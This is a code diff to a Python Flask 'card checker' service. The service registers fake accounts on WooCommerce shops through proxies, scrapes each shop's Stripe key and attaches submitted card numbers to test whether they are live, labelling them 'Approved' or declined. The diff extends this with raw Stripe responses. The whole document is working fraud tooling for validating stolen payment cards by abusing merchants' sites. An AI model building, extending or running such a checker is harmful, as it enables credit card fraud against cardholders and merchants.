@@ -70,9 +70,15 @@ def generate_guid():
 
 async def process_stripe_card(base_url, card_data, proxy_url=None, auth_mode=1, shared_email=None, shared_password=None):
     """
-    Stripe card validation logic (unchanged from original)
+    Stripe card validation logic - now returns (success, message, details)
+    where details contains original Stripe responses.
     """
     ua = UserAgent()
+    details = {
+        'stripe_payment_method_response': None,
+        'stripe_confirmation_response': None,
+        'used_endpoint': None
+    }
     try:
         if not base_url.startswith('http'):
             base_url = 'https://' + base_url
@@ -85,6 +91,7 @@ async def process_stripe_card(base_url, card_data, proxy_url=None, auth_mode=1, 
             domain = f"{parsed.scheme}://{parsed.netloc}"
             email = generate_random_email()
 
+            # Authentication mode 1 (register) or 2 (login) - same as original
             if auth_mode == 1:
                 log("Mode 1: Registering new account")
                 headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9', 'user-agent': ua.random}
@@ -142,6 +149,7 @@ async def process_stripe_card(base_url, card_data, proxy_url=None, auth_mode=1, 
                     login_data = {'username': shared_email, 'password': shared_password, 'woocommerce-login-nonce': login_nonce, 'login': 'Log in'}
                     await session.post(base_url, headers=headers, data=login_data, proxy=proxy_url)
 
+            # ----- Get add-payment-method page -----
             add_payment_url = base_url.rstrip('/') + '/add-payment-method/'
             if '/my-account/add-payment-method' not in add_payment_url:
                 add_payment_url = f"{domain}/my-account/add-payment-method/"
@@ -172,6 +180,7 @@ async def process_stripe_card(base_url, card_data, proxy_url=None, auth_mode=1, 
             elif not stripe_key.startswith('pk_'):
                 stripe_key = 'pk_' + stripe_key
 
+            # ----- Create Payment Method via Stripe API -----
             stripe_headers = {
                 'accept': 'application/json',
                 'content-type': 'application/x-www-form-urlencoded',
@@ -205,13 +214,15 @@ async def process_stripe_card(base_url, card_data, proxy_url=None, auth_mode=1, 
             log("Creating Payment Method...")
             pm_resp = await session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, proxy=proxy_url)
             pm_json = await pm_resp.json()
+            details['stripe_payment_method_response'] = pm_json  # Store original response
 
             if 'error' in pm_json:
-                return False, pm_json['error']['message']
+                return False, pm_json['error']['message'], details
             pm_id = pm_json.get('id')
             if not pm_id:
-                return False, "Failed to create Payment Method"
+                return False, "Failed to create Payment Method", details
 
+            # ----- Confirm Setup Intent on site -----
             confirm_headers = {
                 'accept': 'application/json, text/javascript, */*; q=0.01',
                 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
@@ -239,24 +250,33 @@ async def process_stripe_card(base_url, card_data, proxy_url=None, auth_mode=1, 
                 try:
                     res = await session.post(endp['url'], data=endp['data'], headers=confirm_headers, proxy=proxy_url)
                     text = await res.text()
+                    details['used_endpoint'] = endp['url']
+                    # Try to parse JSON, but keep raw text if not JSON
+                    try:
+                        details['stripe_confirmation_response'] = json.loads(text)
+                    except:
+                        details['stripe_confirmation_response'] = text
+
                     if 'success' in text:
                         js = json.loads(text)
                         branding = f" [Verified by {_0x4f2b}]"
                         if js.get('success'):
                             status = js.get('data', {}).get('status')
                             if status == 'succeeded':
-                                return True, f"Approved (Status: succeeded){branding}"
-                            return True, f"Approved (Status: {status}){branding}"
+                                return True, f"Approved (Status: succeeded){branding}", details
+                            return True, f"Approved (Status: {status}){branding}", details
                         else:
                             error_msg = js.get('data', {}).get('error', {}).get('message', 'Declined')
-                            return False, f"{error_msg}{branding}"
-                except:
+                            return False, f"{error_msg}{branding}", details
+                except Exception as e:
+                    details['stripe_confirmation_response'] = {'error': str(e)}
                     continue
 
-            return False, "Failed to confirm payment method on site"
+            return False, "Failed to confirm payment method on site", details
 
     except Exception as e:
-        return False, f"System Error: {str(e)}"
+        details['exception'] = str(e)
+        return False, f"System Error: {str(e)}", details
 
 # ---------- Flask API ----------
 app = Flask(__name__)
@@ -298,21 +318,22 @@ def check_card():
 
     # 4. Run Stripe check
     try:
-        success, message = run_async(process_stripe_card(site_url, card_data, proxy, auth_mode=1))
+        success, message, details = run_async(process_stripe_card(site_url, card_data, proxy, auth_mode=1))
     except Exception as e:
         return jsonify({'error': f'Internal processing error: {str(e)}'}), 500
 
-    # 5. Return JSON response (no design)
+    # 5. Return JSON response with original Stripe responses
     response = {
         'success': success,
         'message': message,
         'card': cc,
-        'site': site_url
+        'site': site_url,
+        'stripe_responses': details  # contains payment_method and confirmation responses
     }
     if proxy:
         response['proxy'] = proxy
 
-    return jsonify(response), 200 if success else 200  # always 200, success flag indicates result
+    return jsonify(response), 200
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
